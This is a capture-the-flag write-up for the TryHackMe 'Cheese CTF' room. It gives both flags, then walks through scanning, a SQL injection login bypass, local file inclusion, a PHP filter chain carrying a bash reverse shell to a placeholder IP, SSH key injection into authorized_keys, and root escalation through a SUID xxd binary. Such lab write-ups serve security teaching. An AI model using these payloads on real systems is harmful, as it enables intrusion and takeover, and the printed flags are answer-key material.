# <div align="center">[Cheese CTF](https://tryhackme.com/r/room/cheesectfv10)</div>


<div align="center">
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1718375657104" height="200"></img>
</div>

# Task 1. Flags
Hack into the machine and get the flags!

## What is the user.txt flag?
```
THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
```
## What is the root.txt flag?
```
THM{dca75486094810807faf4b7b0a929b11e5e0167c}
```

# Let start with Scanning Network.
```
death@esther:~$ nmap 10.10.228.119 -sV -T 4

PORT      STATE SERVICE               VERSION
1/tcp     open  tcpmux?
3/tcp     open  compressnet?
340/tcp   open  http                  Motorola cable modem webadmin
366/tcp   open  odmr?
389/tcp   open  telnet                Allied Telesis x900-series switch telnetd
406/tcp   open  melange               Melange Chat Server 3VhUqW
407/tcp   open  pop3-proxy            AVG pop3 proxy 346/67007
416/tcp   open  silverplatter?
417/tcp   open  onmux?
425/tcp   open  telnet
427/tcp   open  telnet
443/tcp   open  https?
444/tcp   open  smtp                  IMail NT-ESMTP ..._.p..c
445/tcp   open  http                  Corel Paradox relational database web interface 9.X (Embedded BWS 1.0b3)
458/tcp   open  printer               Microsoft lpd

```

* ## There are lots of ports open best part is HTTP is open, Let hop to website.

<div align="center">
<img src="https://github.com/user-attachments/assets/6d547578-1cd9-4309-b6c3-9b4774dc07c5" height="400"></img>
</div>


## Let Enumerate web directories
```
dirsearch -u 10.10.228.119
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/death/reports/_10.10.228.119/_24-09-28_01-34-24.txt

Target: http://10.10.228.119/

[01:34:24] Starting: 
[01:34:33] 403 -  278B  - /.ht_wsr.txt
[01:34:33] 403 -  278B  - /.htaccess.bak1
[01:34:33] 403 -  278B  - /.htaccess.sample
[01:34:33] 403 -  278B  - /.htaccess.orig
[01:34:33] 403 -  278B  - /.htaccess.save
[01:34:33] 403 -  278B  - /.htaccess_orig
[01:34:33] 403 -  278B  - /.htaccess_extra
[01:34:33] 403 -  278B  - /.htaccessBAK
[01:34:33] 403 -  278B  - /.htaccess_sc
[01:34:33] 403 -  278B  - /.htaccessOLD2
[01:34:33] 403 -  278B  - /.htaccessOLD
[01:34:33] 403 -  278B  - /.html
[01:34:33] 403 -  278B  - /.htpasswd_test
[01:34:33] 403 -  278B  - /.htm
[01:34:33] 403 -  278B  - /.htpasswds
[01:34:33] 403 -  278B  - /.httr-oauth
[01:34:35] 403 -  278B  - /.php
[01:35:14] 301 -  315B  - /images  ->  http://10.10.228.119/images/
[01:35:14] 200 -  485B  - /images/
[01:35:18] 200 -  370B  - /login.php
[01:35:25] 200 -  254B  - /orders.html
[01:35:34] 403 -  278B  - /server-status/
[01:35:34] 403 -  278B  - /server-status
[01:35:43] 200 -  254B  - /users.html

Task Completed
```
## Let Take a look at login page

<div align="center">
<img src="https://github.com/user-attachments/assets/ae9690d4-ffb0-4df9-a986-5da9eb3a1752" height="200"></img>
</div>

## As We Don't have any info, Let try ```Sql Injection``` Maybe we get something.

```
' || '1'='1';-- -
```
<div align="center">
<img src="https://github.com/user-attachments/assets/18981549-e2f2-4e1e-9784-87b901ed4cf8" height="200"></img>
</div>

## I got Access

<div align="center">
<img src="https://github.com/user-attachments/assets/b5e2ecf6-e688-4682-8fdc-ee0e16d3a472" height="200"></img>
</div>

## The Website is completly blank,There is Message let tap on it.

<div align="center">
<img src="https://github.com/user-attachments/assets/ac6b22a7-ff91-48b9-a2aa-1b01f071a274" height="200"></img>
</div>

## There is something

<div align="center">
<img src="https://github.com/user-attachments/assets/44769c87-a201-465c-94b5-f5e67918619f" height="200"></img>
</div>

## Its a clue
* ## We can see the path ```http://10.10.228.119/secret-script.php?file=php://filter/resource=supersecretmessageforadmin``` Let try LFI as it a whole path let exploit it

## JackPot 
```
http://10.10.228.119/secret-script.php?file=/etc/passwd
```
<div align="center">
<img src="https://github.com/user-attachments/assets/e26846e3-8c69-457f-a3ba-d6f2d5f1c3ee" height="200"></img>
</div>

## Let create a reverse shell.

```
git clone https://github.com/synacktiv/php_filter_chain_generator.git && cd php_filter_chain_generator && clear && ls
```
```
python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/PUT-YOUR-IP-HERE/4444 0>&1\"'); ?>" | grep "^php" > payload.txt

```
## Our Reverse shell is ready

<div align="center">
<img src="https://github.com/user-attachments/assets/c2855054-1b0f-4064-b520-133687ca10a3" height="400"></img>
</div>

##  Open Netcat in Another terminal
```
nc -lnvp 4444
```

## Let send this Payload using curl command
```
curl "http://10.10.228.119/secret-script.php?file=$(cat payload.txt)"
```

## Here we got our shell

<div align="center">
<img src="https://github.com/user-attachments/assets/58f8ee51-2957-4d4a-87f3-a1b0b93fed19" height="200"></img>
</div>

# Let EscalatePrivileges

## Opening python server on our system.

<div align="center">
<img src="https://github.com/user-attachments/assets/bba5ca3d-c170-44d6-94b4-9cbf894ec620" height="200"></img>
</div>

## Let download linpease from our system.

<div align="center">
<img src="https://github.com/user-attachments/assets/08e536e0-4b67-4e0c-a03e-4faae429c86e" height="400"></img>
</div>

## Linpease found ```/home/comt/.ssh/authorized_keys```, which can be modified. We can create our own SSH key pair on our machine and add the public key to this file so we are allowimg us to log in.

<div align="center">
<img src="https://github.com/user-attachments/assets/3bc7ad7c-4de3-4268-ad16-7aff0ee6567f" height="400"></img>
</div>

## Let create An SSH key on our system
```
ssh-keygen -t rsa
```

## Let view the pub key

```
death@esther:~$ cat .ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAFK2k5zBYD1W7EtVkTHU6WcmMw/TOS7WpXtZsiR6QmgwZWv7KzZ43OVTXJ22s8os5NnLp0ABrr0CwjVFoH5uDYcAzKEZp3GtbLVr0TZaNT6Vds8SeZ+5RZzGs/84Ue5FBAQVeak/5+wjZoYezOTV9c7YrkIDSS1Rs0xQ0zfjcIdumzhM5grL+ldpa1HB1J1PzBDfkP2hWwL0pt4et6GhCtpGkYSyS8rLwkU2G/S/qB0iB/OM2hGeWHpbIhQDAB15bVnzjQksBNeagdlFHmQ90pjVG0oTaWp3hpzMrLUav/6Vt/1O2HE8KZ11erIDMgIpNc5nbvSWJfCDFH4JX1/UFod0v/lQTm6LEsnSf1E4CTK/FVAAKuYAd6IM8Ul1//Re2x9Eh5oRRVpIGVwq83di3N8mKiSSLHirL7k+SrkmViJ+hJtaC6FbbxSikjnq5vdqs6k9CzXk6aQKD29NY/npFvKTjxDEJDKiUr7IDOvKLKMx6BS2T7bVePBGidNxwxY8= death@esther
```
## Let Add this to the file

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAFK2k5zBYD1W7EtVkTHU6WcmMw/TOS7WpXtZsiR6QmgwZWv7KzZ43OVTXJ22s8os5NnLp0ABrr0CwjVFoH5uDYcAzKEZp3GtbLVr0TZaNT6Vds8SeZ+5RZzGs/84Ue5FBAQVeak/5+wjZoYezOTV9c7YrkIDSS1Rs0xQ0zfjcIdumzhM5grL+ldpa1HB1J1PzBDfkP2hWwL0pt4et6GhCtpGkYSyS8rLwkU2G/S/qB0iB/OM2hGeWHpbIhQDAB15bVnzjQksBNeagdlFHmQ90pjVG0oTaWp3hpzMrLUav/6Vt/1O2HE8KZ11erIDMgIpNc5nbvSWJfCDFH4JX1/UFod0v/lQTm6LEsnSf1E4CTK/FVAAKuYAd6IM8Ul1//Re2x9Eh5oRRVpIGVwq83di3N8mKiSSLHirL7k+SrkmViJ+hJtaC6FbbxSikjnq5vdqs6k9CzXk6aQKD29NY/npFvKTjxDEJDKiUr7IDOvKLKMx6BS2T7bVePBGidNxwxY8= death@esther
" >> /home/comte/.ssh/authorized_keys
```
<div align="center">
<img src="https://github.com/user-attachments/assets/63e308b3-8365-46cc-984c-16eaddeddf81" height="100"></img>
</div>

## Login through SSH
```
ssh -i id_rsa comte@10.10.228.119
```
<div align="center">
<img src="https://github.com/user-attachments/assets/1048bc7d-a60f-4b55-bfc0-a52cde43f4e7" height="600"></img>
</div>

# USER FLAG

```
comte@cheesectf:~$ cat user.txt 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
```

## Let see  comte’s privilege.
```
comte@cheesectf:~$ sudo -l
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
comte@cheesectf:~$ 
```
## We can execute systemctl and modify a file called ```exploit.timer```, which can be used to run an exploit service

## Let view this file

<div align="center">
<img src="https://github.com/user-attachments/assets/c02008c2-e0ba-4cb2-a5f7-8ea35411c248" height="400"></img>
</div>

```
comte@cheesectf:/etc/systemd/system$ cat exploit.service 

[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```
## The service will trigger xxd 
## Let view timer file

```
comte@cheesectf:/etc/systemd/system$ cat exploit.timer 
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
comte@cheesectf:/etc/systemd/system$ 
```
## Let set time to it

<div align="center">
<img src="https://github.com/user-attachments/assets/7bec3a75-3773-479d-9b59-9779da413516" height="200"></img>
</div>

## It will trigger xxd when we run it, if u dont no about xxd its an binarry function we can read about it on [gtfobins](https://gtfobins.github.io/gtfobins/xxd/)

<div align="center">
<img src="https://github.com/user-attachments/assets/0d978cb7-9689-4192-96ff-f880ea2f199b" height="400"></img>
</div>

## According to this we can get simply root privileges writting the ssh key we generated with access to the `xxd` binary.

## First let run this service 
```
sudo systemctl daemon-reload
```
```
sudo systemctl start exploit.time
```

##   Let write our ssh key with xxd

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAFK2k5zBYD1W7EtVkTHU6WcmMw/TOS7WpXtZsiR6QmgwZWv7KzZ43OVTXJ22s8os5NnLp0ABrr0CwjVFoH5uDYcAzKEZp3GtbLVr0TZaNT6Vds8SeZ+5RZzGs/84Ue5FBAQVeak/5+wjZoYezOTV9c7YrkIDSS1Rs0xQ0zfjcIdumzhM5grL+ldpa1HB1J1PzBDfkP2hWwL0pt4et6GhCtpGkYSyS8rLwkU2G/S/qB0iB/OM2hGeWHpbIhQDAB15bVnzjQksBNeagdlFHmQ90pjVG0oTaWp3hpzMrLUav/6Vt/1O2HE8KZ11erIDMgIpNc5nbvSWJfCDFH4JX1/UFod0v/lQTm6LEsnSf1E4CTK/FVAAKuYAd6IM8Ul1//Re2x9Eh5oRRVpIGVwq83di3N8mKiSSLHirL7k+SrkmViJ+hJtaC6FbbxSikjnq5vdqs6k9CzXk6aQKD29NY/npFvKTjxDEJDKiUr7IDOvKLKMx6BS2T7bVePBGidNxwxY8= death@esther" | xxd | /opt/xxd -r - "/root/.ssh/authorized_keys"
```

## Let login with ssh 

```
ssh -i id_rsa root@10.10.228.119
```

## ROOT FLAG
```
root@cheesectf:~# cat /root/root.txt
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{dca75486094810807faf4b7b0a929b11e5e0167c}
```

🙂
